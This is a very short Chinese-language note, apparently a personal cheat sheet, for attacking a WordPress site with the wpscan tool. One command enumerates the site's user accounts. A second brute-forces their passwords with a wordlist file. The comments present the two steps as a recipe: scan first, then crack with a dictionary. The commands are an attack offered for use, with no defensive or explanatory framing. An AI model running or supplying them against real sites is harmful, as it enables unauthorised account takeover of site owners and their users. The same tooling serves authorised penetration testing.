#先使用wpscan来进行扫描网站，再用字典来进行爆破  
wpscan --url 地址/wordpress --enumerate u    

#后半段基本上就所使用字典来进行破解。  
wpscan --url 地址/wordpress --wordlist /root/1.txt  